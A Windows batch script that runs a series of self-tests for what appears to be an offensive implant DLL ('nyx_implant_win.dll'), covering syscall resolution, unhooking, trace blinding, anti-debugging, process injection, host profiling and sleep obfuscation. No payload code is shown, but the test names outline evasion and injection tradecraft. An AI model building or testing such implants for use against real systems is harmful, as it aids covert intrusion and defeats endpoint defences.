@echo off
rem === Nyx full selftest suite on WS2019 (17763) ===

echo === nyx_selftest (PEB+SSN+crypto) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest
echo %ERRORLEVEL%

echo === nyx_selftest_evasion (unhook diff + blind verify) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_evasion
echo %ERRORLEVEL%

echo === nyx_selftest_rt_steps (runtime init) ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_rt_steps
echo %ERRORLEVEL%

echo === nyx_selftest_gap_scan ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_gap_scan
echo %ERRORLEVEL%

echo === nyx_selftest_mem ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_mem
echo %ERRORLEVEL%

echo === nyx_selftest_blind_nttrace ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_blind_nttrace
echo %ERRORLEVEL%

echo === nyx_selftest_antidebug ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_antidebug
echo %ERRORLEVEL%

echo === nyx_selftest_inject ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_inject
echo %ERRORLEVEL%

echo === nyx_selftest_hostinfo ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_hostinfo
echo %ERRORLEVEL%

echo === nyx_selftest_foliage ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_foliage
echo %ERRORLEVEL%

echo === nyx_selftest_foliage_apc ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_foliage_apc
echo %ERRORLEVEL%

echo === nyx_selftest_swap_decision ===
rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_swap_decision
echo %ERRORLEVEL%
